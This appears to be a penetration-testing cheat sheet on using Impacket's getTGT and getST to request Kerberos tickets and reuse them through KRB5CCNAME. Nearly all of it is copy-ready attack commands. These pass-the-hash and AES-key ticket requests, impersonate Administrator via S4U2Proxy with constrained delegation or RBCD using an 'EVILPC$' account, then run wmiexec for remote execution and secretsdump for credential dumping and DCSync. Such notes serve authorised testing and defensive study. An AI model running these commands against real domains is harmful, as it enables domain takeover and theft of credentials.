# 07.06 getTGT.py getST.py Ticket Operations

> Request TGTs (`getTGT.py`) or service tickets via S4U2Self+Proxy (`getST.py`) and save as `.ccache` for `KRB5CCNAME` reuse.

## Overview

getTGT obtains a TGT for a user. getST obtains a service ticket, optionally using S4U2Self+S4U2Proxy for impersonation (constrained delegation, RBCD attacks). Tickets saved as .ccache files.

## Steps

- getTGT: needs password, NT hash, or AES key; saves <user>.ccache
- getST with -impersonate performs S4U2Self + S4U2Proxy; requires delegation rights
- Set KRB5CCNAME to use ticket with any Kerberos-capable tool (-k -no-pass)
- RBCD: after setting msDS-AllowedToActOnBehalfOfOtherIdentity, use getST to impersonate DA
- Constrained delegation: computer/service account with delegation configured can S4U2Proxy
- Always use FQDN (not IP) as the target when using Kerberos tickets

## Commands

### getTGT — obtain TGT

```bash
impacket-getTGT DOMAIN/user:'P@ss' -dc-ip DC_IP
impacket-getTGT DOMAIN/user -hashes :NThash -dc-ip DC_IP
impacket-getTGT DOMAIN/user -aesKey <AES256key> -dc-ip DC_IP
```

### Use TGT for subsequent commands

```bash
export KRB5CCNAME=$(pwd)/user.ccache
impacket-wmiexec -k -no-pass DOMAIN/user@TARGET.DOMAIN.LOCAL
impacket-secretsdump -k -no-pass DOMAIN/user@DC01.DOMAIN.LOCAL
```

### getST — standard service ticket

```bash
impacket-getST DOMAIN/user:'P@ss' -spn cifs/TARGET.DOMAIN.LOCAL -dc-ip DC_IP
impacket-getST -hashes :NThash DOMAIN/user -spn cifs/TARGET.DOMAIN.LOCAL -dc-ip DC_IP
```

### getST — S4U impersonation (constrained delegation / RBCD)

```bash
impacket-getST DOMAIN/user:'P@ss' -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
impacket-getST -hashes :NThash DOMAIN/SVC_ACCOUNT -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
# RBCD variant:
impacket-getST DOMAIN/EVILPC$:'EvilPass!' -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
```

### Use impersonated ticket

```bash
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
impacket-wmiexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
```

### getST — additional SPN variants

```bash
impacket-getST DOMAIN/user:pass -spn host/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
impacket-getST DOMAIN/user:pass -spn http/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
impacket-getST DOMAIN/user:pass -spn ldap/DC01.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
# ldap SPN allows DCSync via secretsdump
```
